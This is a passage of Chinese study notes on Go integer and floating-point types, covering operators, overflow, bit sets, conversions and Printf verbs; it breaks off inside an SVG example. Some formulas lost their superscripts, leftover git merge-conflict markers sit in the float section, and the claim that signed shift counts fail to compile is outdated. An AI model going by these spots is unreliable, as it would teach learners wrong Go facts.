整型</h2>\n<h3>不同的整型&amp;值域</h3>\n<p>Go语言同时提供了有符号和无符号类型的整数运算。</p>\n<ul>\n<li>int8、int16、int32和int64四种截然不同大小的有符号整数类型，分别对应8、16、32、64bit大小的有符号整数，与此对应的是uint8、uint16、uint32和uint64四种无符号整数类型。</li>\n<li>两种一般对应特定CPU平台机器字大小的有符号和无符号整数int和uint；其中int是应用最广泛的数值类型。不同的编译器即使在相同的硬件平台上可能产生不同的大小。</li>\n<li>Unicode字符rune类型是和int32等价的类型，通常用于表示一个Unicode码点。这两个名称可以互换使用。</li>\n<li>byte也是uint8类型的等价类型，byte类型一般用于强调数值是一个原始的数据而不是一个小的整数。</li>\n<li>无符号的整数类型uintptr，没有指定具体的bit大小但是足以容纳指针。uintptr类型只有在底层编程时才需要，特别是Go语言和C语言函数库或操作系统接口相交互的地方。</li>\n</ul>\n<p>不管它们的具体大小，int、uint和uintptr是不同类型的兄弟类型。其中int和int32也是不同的类型，即使int的大小也是32bit，在需要将int当作int32类型的地方需要一个显式的类型转换操作，反之亦然。</p>\n<p><strong>值域</strong></p>\n<p>其中有符号整数采用2的补码形式表示，也就是最高bit位用来表示符号位，一个n-bit的有符号数的值域是从-2n-1到2n-1-1。无符号整数的所有bit位都用于表示非负数，值域是0到2n-1。例如，int8类型整数的值域是从-128到127，而uint8类型整数的值域是从0到255。</p>\n<h3>二元运算符</h3>\n<p>下面是Go语言中关于算术运算、逻辑运算和比较运算的二元运算符，它们按照优先级递减的顺序排列：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>*      /      %      &lt;&lt;       &gt;&gt;     &amp;       &amp;^\n+      -      |      ^\n==     !=     &lt;      &lt;=       &gt;      &gt;=\n&amp;&amp;\n||\n</code></pre></div><p>二元运算符有五种优先级。在同一个优先级，使用左优先结合规则，但是使用括号可以明确优先顺序，使用括号也可以用于提升优先级，例如 <code>mask &amp; (1 &lt;&lt; 28)</code>。对于上表中前两行的运算符，例如+运算符还有一个与赋值相结合的对应运算符+=，可以用于简化赋值语句。</p>\n<h4>算数运算符</h4>\n<ul>\n<li>算术运算符 <code>+</code>、<code>-</code>、<code>*</code>和 <code>/</code>可以适用于整数、浮点数和复数，但是取模运算符%仅用于整数间的运算。</li>\n<li>对于不同编程语言，%取模运算的行为可能并不相同。在Go语言中，%取模运算符的符号和被取模数的符号总是一致的，因此 <code>-5%3</code>和 <code>-5%-3</code>结果都是-2。</li>\n<li>除法运算符 <code>/</code>的行为则依赖于操作数是否全为整数，比如 <code>5.0/4.0</code>的结果是1.25，但是5/4的结果是1，因为整数除法会向着0方向截断余数。</li>\n</ul>\n<p><strong>结果溢出</strong></p>\n<p>一个算术运算的结果，不管是有符号或者是无符号的，如果需要更多的bit位才能正确表示的话，就说明计算结果是溢出了。超出的高位的bit位部分将被丢弃。如果原始的数值是有符号类型，而且最左边的bit位是1的话，那么最终结果可能是负的，例如int8的例子：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var u uint8 = 255\nfmt.Println(u, u+1, u*u) // \"255 0 1\"\n\nvar i int8 = 127\nfmt.Println(i, i+1, i*i) // \"127 -128 1\"\n</code></pre></div><h4>比较运算符</h4>\n<p>两个相同的整数类型可以使用下面的二元比较运算符进行比较；比较表达式的结果是布尔类型。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>==    等于\n!=    不等于\n&lt;     小于\n&lt;=    小于等于\n&gt;     大于\n&gt;=    大于等于\n</code></pre></div><p>事实上，布尔型、数字类型和字符串等基本类型都是可比较的，也就是说两个相同类型的值可以用==和!=进行比较。此外，整数、浮点数和字符串可以根据比较结果排序。许多其它类型的值可能是不可比较的，因此也就可能是不可排序的。对于我们遇到的每种类型，我们需要保证规则的一致性。</p>\n<h3>其他运算符</h3>\n<h4>一元的加减法运算符</h4>\n<p>这里是一元的加法和减法运算符：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>+      一元加法（无效果）\n-      负数\n</code></pre></div><p>对于整数，+x是0+x的简写，-x则是0-x的简写；对于浮点数和复数，+x就是x，-x则是x 的负数。</p>\n<h4>bit位操作运算符</h4>\n<p>Go语言还提供了以下的bit位操作运算符，前面4个操作运算符并不区分是有符号还是无符号数：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&amp;      位运算 AND\n|      位运算 OR\n^      位运算 XOR\n&amp;^     位清空 AND(a, NOT(b))\n&lt;&lt;     左移\n&gt;&gt;     右移\n</code></pre></div><p>位操作运算符 <code>^</code>作为二元运算符时是按位异或（XOR），当用作一元运算符时表示按位取反；也就是说，它返回一个每个bit位都取反的数。</p>\n<p>位操作运算符 <code>&amp;^</code>用于按位置零（AND NOT）：如果对应y中bit位为1的话，表达式 <code>z = x &amp;^ y</code>结果z的对应的bit位为0，否则z对应的bit位等于x相应的bit位的值。</p>\n<h3>无符号&amp;有符号</h3>\n<p>下面的代码演示了如何使用位操作解释uint8类型值的8个独立的bit位。</p>\n<p>使用Printf函数的%b参数打印二进制格式的数字；其中%08b中08表示打印至少8个字符宽度，不足的前缀部分用0填充。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> x <span class=\"token builtin\">uint8</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">5</span>\n<span class=\"token keyword\">var</span> y <span class=\"token builtin\">uint8</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">2</span>\n\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"00100010\", the set {1, 5}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"00000110\", the set {1, 2}</span>\n\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">)</span>  <span class=\"token comment\">// \"00000010\", the intersection {1}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token operator\">|</span>y<span class=\"token punctuation\">)</span>  <span class=\"token comment\">// \"00100110\", the union {1, 2, 5}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token operator\">^</span>y<span class=\"token punctuation\">)</span>  <span class=\"token comment\">// \"00100100\", the symmetric difference {2, 5}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token operator\">&amp;^</span>y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"00100000\", the difference {5}</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">uint</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> x<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// membership test</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"1\", \"5\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"01000100\", the set {2, 6}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08b\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token operator\">&gt;&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"00010001\", the set {0, 4}</span>\n\n</code></pre></div><figure><figcaption>1712132982776</figcaption></figure>\n<p>在x&lt;&lt;n和x&gt;&gt;n移位运算中，n必须是无符号数，x均可。例如上面用i := int(-1)就编不过</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// NOTE: 此处i是无符号整型，才能实现1&lt;&lt;i，例如上面用i := int(-1)就编不过</span>\n\t\t<span class=\"token keyword\">if</span> x<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// membership test</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"1\", \"5\"</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n</code></pre></div><p>算术上，一个x&lt;&lt;n左移运算等价于乘以$2<sup>n$，一个x&gt;&gt;n右移运算等价于除以$2</sup>n$。</p>\n<p>左移运算用零填充右边空缺的bit位，无符号数的右移运算也是用0填充左边空缺的bit位，但是有符号数的右移运算会用符号位的值填充左边空缺的bit位。因为这个原因，最好用无符号运算，这样你可以将整数完全当作一个bit位模式处理。</p>\n<p>尽管Go语言提供了无符号数的运算，但即使数值本身不可能出现负数，我们还是倾向于使用有符号的int类型，就像数组的长度那样，虽然使用uint无符号类型似乎是一个更合理的选择。事实上，内置的len函数返回一个有符号的int，我们可以像下面例子那样处理逆序循环。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\tmedals <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"gold\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"silver\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"bronze\"</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: 此处len(medals)返回的有符号int类型，要不然i--总&gt;=0，就死循环了</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>medals<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>medals<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"bronze\", \"silver\", \"gold\"</span>\n\t<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在三次迭代之后，也就是i == 0时，i--语句将不会产生-1，而是变成一个uint类型的最大值（可能是$2^64-1$），然后medals[i]表达式运行时将发生panic异常（§5.9），也就是试图访问一个slice范围以外的元素。</p>\n<blockquote>\n<p>无符号数往往只有在位运算或其它特殊的运算场景才会使用，就像bit集合、分析二进制文件格式或者是哈希和加密操作等。它们通常并不用于仅仅是表达非负数量的场合。</p>\n</blockquote>\n<h3>数值类型转换</h3>\n<p>需要一个显式的转换将一个值从一种类型转化为另一种类型，并且算术和逻辑运算的二元操作中必须是相同的类型。类似下面代码的常见的错误：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var apples int32 = 1\nvar oranges int16 = 2\nvar compote int = apples + oranges // compile error\n</code></pre></div><p>当尝试编译这三个语句时，将产生一个错误信息：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>invalid operation: apples + oranges (mismatched types int32 and int16)\n</code></pre></div><p>这种类型不匹配的问题可以有几种不同的方法修复，最常见方法是将它们都显式转型为一个常见类型：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var compote = int(apples) + int(oranges)\n</code></pre></div><p>如2.5节所述，对于每种类型T，如果转换允许的话，类型转换操作T(x)将x转换为T类型。许多整数之间的相互转换并不会改变数值；它们只是告诉编译器如何解释这个值。但是对于将一个大尺寸的整数类型转为一个小尺寸的整数类型，或者是将一个浮点数转为整数，可能会改变数值或丢失精度：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>f := 3.141 // a float64\ni := int(f)\nfmt.Println(f, i) // \"3.141 3\"\nf = 1.99\nfmt.Println(int(f)) // \"1\"\n</code></pre></div><p>浮点数到整数的转换将丢失任何小数部分，然后向数轴零方向截断。你应该避免对可能会超出目标类型表示范围的数值做类型转换，因为截断的行为可能依赖于具体的实现：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>f := 1e100  // a float64\ni := int(f) // 结果依赖于具体实现\n</code></pre></div><figure><figcaption>image-20240409145949392</figcaption></figure>\n<ul>\n<li>任何大小的整数字面值都可以用以0开始的八进制格式书写，例如0666，八进制数据通常用于POSIX操作系统上的文件访问权限标志；</li>\n<li>或用以0x或0X开头的十六进制格式书写，例如0xdeadbeef，（大小写都可），十六进制数字则更强调数字值的bit位模式。</li>\n</ul>\n<h3>格式化输出整型</h3>\n<p>当使用fmt包打印一个数值时，我们可以用 <code>%d</code>、<code>%o</code>或 <code>%x</code>参数控制输出的进制格式</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>o := 0666\nfmt.Printf(\"%d %[1]o %#[1]o\\n\", o) // \"438 666 0666\"\nx := int64(0xdeadbeef)\nfmt.Printf(\"%d %[1]x %#[1]x %#[1]X\\n\", x)\n// Output:\n// 3735928559 deadbeef 0xdeadbeef 0XDEADBEEF\n</code></pre></div><p>意义：</p>\n<ol>\n<li>%d 是格式化占位符，表示按照十进制格式输出一个整数。</li>\n<li>%[1]o 是格式化占位符的扩展用法，[1] 表示引用第一个参数，o 表示按照八进制格式输出一个整数。</li>\n<li>%#[1]o 是格式化占位符的扩展用法，# 表示输出格式带有前缀，[1] 表示引用第一个参数，o 表示按照八进制格式输出一个整数。</li>\n<li>%[1]x类似%[1]o，x表示十六进制</li>\n<li>%#[1]x带前缀，十六进制，前缀为0x</li>\n<li>%#[1]X带前缀，十六进制，前缀为0X</li>\n</ol>\n<p>字符也可以转成整型，也就是转成他的Unicode，字符使用 <code>%c</code>参数打印，或者是用 <code>%q</code>参数打印带单引号的字符：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>ascii <span class=\"token operator\">:=</span> <span class=\"token char\">'a'</span>\nunicode <span class=\"token operator\">:=</span> <span class=\"token char\">'国'</span>\nnewline <span class=\"token operator\">:=</span> <span class=\"token char\">'\\n'</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d %[1]c %[1]q\\n\"</span><span class=\"token punctuation\">,</span> ascii<span class=\"token punctuation\">)</span>   <span class=\"token comment\">// \"97 a 'a'\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d %[1]c %[1]q\\n\"</span><span class=\"token punctuation\">,</span> unicode<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"22269 国 '国'\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d %[1]q\\n\"</span><span class=\"token punctuation\">,</span> newline<span class=\"token punctuation\">)</span>       <span class=\"token comment\">// \"10 '\\n'\"</span>\n</code></pre></div><figure><figcaption></figcaption></figure>\n<h2>3.2. 浮点数</h2>\n<h3>浮点数精度</h3>\n<p>Go提供两种精度的浮点数，float32和float64。浮点数的范围极限可以在math包中找到。常量math.MaxFloat32表示float32能表示的最大数值，大约是 3.4e38；对应的math.MaxFloat64常量大约是1.8e308。它们分别能表示的最小值近似为1.4e-45和4.9e-324。一个float32类型的浮点数可以提供大约6个十进制数的精度，而float64则可以提供约15个十进制数的精度；</p>\n<p>通常应该优先使用float64类型，因为float32类型的累计计算误差很容易扩散，float32的有效bit位只有23个，其它的bit位用于指数和符号；当整数大于23bit能表达的范围时，float32的表示将出现误差：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> f <span class=\"token builtin\">float32</span> <span class=\"token operator\">=</span> <span class=\"token number\">16777216</span> <span class=\"token comment\">// 1 &lt;&lt; 24</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>f <span class=\"token operator\">==</span> f<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">// \"true\"!</span>\n</code></pre></div><p>浮点数的字面值可以直接写小数部分，像这样：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">const</span> e <span class=\"token operator\">=</span> <span class=\"token number\">2.71828</span> <span class=\"token comment\">// (approximately)</span>\n</code></pre></div><p>小数点前面或后面的数字都可能被省略（例如.707或1.）。很小或很大的数最好用科学计数法书写，通过e或E来指定指数部分：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">const</span> Avogadro <span class=\"token operator\">=</span> <span class=\"token number\">6.02214129e23</span>  <span class=\"token comment\">// 阿伏伽德罗常数</span>\n<span class=\"token keyword\">const</span> Planck   <span class=\"token operator\">=</span> <span class=\"token number\">6.62606957e-34</span> <span class=\"token comment\">// 普朗克常数\\</span>\n</code></pre></div><p>用Printf函数的%g参数打印浮点数，将采用更紧凑的表示形式打印，并提供足够的精度，但是对应表格的数据，使用%e（带指数）或%f的形式打印可能更合适。所有的这三个打印形式都可以指定打印的宽度和控制打印精度。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">for</span> x <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> x <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> x<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x = %d e^x = %8.3f\\n\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Exp</span><span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上面代码打印e的幂，打印精度是小数点后三个小数精度和8个字符宽度：</p>\n<figure><figcaption>1712825319476</figcaption></figure>\n<p>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</p>\n<h3>浮点数特殊值</h3>\n<p>=======</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>96567323cfc2043fbd664cc254d198a3cc1f5994\nmath包中除了提供大量常用的数学函数外，还提供了IEEE754浮点数标准中定义的特殊值的创建和测试：正无穷大和负无穷大，分别用于表示太大溢出的数字和除零的结果；还有NaN非数，一般用于表示无效的除法操作结果0/0或Sqrt(-1).</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> z <span class=\"token builtin\">float64</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>z<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span>z<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">/</span>z<span class=\"token punctuation\">,</span> z<span class=\"token operator\">/</span>z<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"0 -0 +Inf -Inf NaN\"</span>\n</code></pre></div><p>函数<code>math.IsNaN</code>用于测试一个数是否是非数NaN，<code>math.NaN</code>则返回非数对应的值。虽然可以用<code>math.NaN</code>来表示一个非法的结果，但是测试一个结果是否是非数NaN则是充满风险的，因为NaN和任何数都是不相等的（译注：在浮点数中，NaN、正无穷大和负无穷大都不是唯一的，每个都有非常多种的bit模式表示）：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>nan <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">NaN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>nan <span class=\"token operator\">==</span> nan<span class=\"token punctuation\">,</span> nan <span class=\"token operator\">&lt;</span> nan<span class=\"token punctuation\">,</span> nan <span class=\"token operator\">&gt;</span> nan<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"false false false\"</span>\n</code></pre></div><figure><figcaption>image-20240411172248377</figcaption></figure>\n<p>如果一个函数返回的浮点数结果可能失败，最好的做法是用单独的标志报告失败，像这样：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">compute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>value <span class=\"token builtin\">float64</span><span class=\"token punctuation\">,</span> ok <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ...</span>\n    <span class=\"token keyword\">if</span> failed <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>接下来的程序演示了通过浮点计算生成的图形。它是带有两个参数的z = f(x, y)函数的三维形式，使用了可缩放矢量图形（SVG）格式输出，SVG是一个用于矢量线绘制的XML标准。图3.1显示了sin(r)/r函数的输出图形，其中r是<code>sqrt(x*x+y*y)</code>。</p>\n<figure><figcaption>image-20240415134037655</figcaption></figure>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Surface computes an SVG rendering of a 3-D surface function.</span>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"fmt\"</span>\n    <span class=\"token string\">\"math\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n    width<span class=\"token punctuation\">,</span> height <span class=\"token operator\">=</span> <span class=\"token number\">600</span><span class=\"token punctuation\">,</span> <span class=\"token number\">320</span>            <span class=\"token comment\">// canvas size in pixels</span>\n    cells         <span class=\"token operator\">=</span> <span class=\"token number\">100</span>                 <span class=\"token comment\">// number of grid cells</span>\n    xyrange       <span class=\"token operator\">=</span> <span class=\"token number\">30.0</span>                <span class=\"token comment\">// axis ranges (-xyrange..+xyrange)</span>\n    xyscale       <span class=\"token operator\">=</span> width <span class=\"token operator\">/</span> <span class=\"token number\">2</span> <span class=\"token operator\">/</span> xyrange <span class=\"token comment\">// pixels per x or y unit</span>\n    zscale        <span class=\"token operator\">=</span> height <span class=\"token operator\">*</span> <span class=\"token number\">0.4</span>        <span class=\"token comment\">// pixels per z unit</span>\n    angle         <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span>Pi <span class=\"token operator\">/</span> <span class=\"token number\">6</span>         <span class=\"token comment\">// angle of x, y axes (=30°)</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> sin30<span class=\"token punctuation\">,</span> cos30 <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>angle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Cos</span><span class=\"token punctuation\">(</span>angle<span class=\"token punctuation\">)</span> <span class=\"token comment\">// sin(30°), cos(30°)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;svg xmlns='http://www.w3.org/2000/svg' \"</span><span class=\"token operator\">+</span>\n        <span class=\"token string\">\"style='stroke: grey; fill: white; stroke-width: 0.7' \"</span><span class=\"token operator\">+</span>\n        <span class=\"token string\">\"width='%d' height='%d'&gt;\"</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> cells<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> cells<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n            ax<span class=\"token punctuation\">,</span> ay <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n            bx<span class=\"token punctuation\">,</span> by <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n            cx<span class=\"token punctuation\">,</span> cy <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            dx<span class=\"token punctuation\">,</span> dy <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;polygon points='%g,%g %g,%g %g,%g %g,%g'/&gt;\\n\"</span><span class=\"token punctuation\">,</span>\n                ax<span class=\"token punctuation\">,</span> ay<span class=\"token punctuation\">,</span> bx<span class=\"token punctuation\">,</span> by<span class=\"token punctuation\">,</span> cx<span class=\"token punctuation\">,</span> 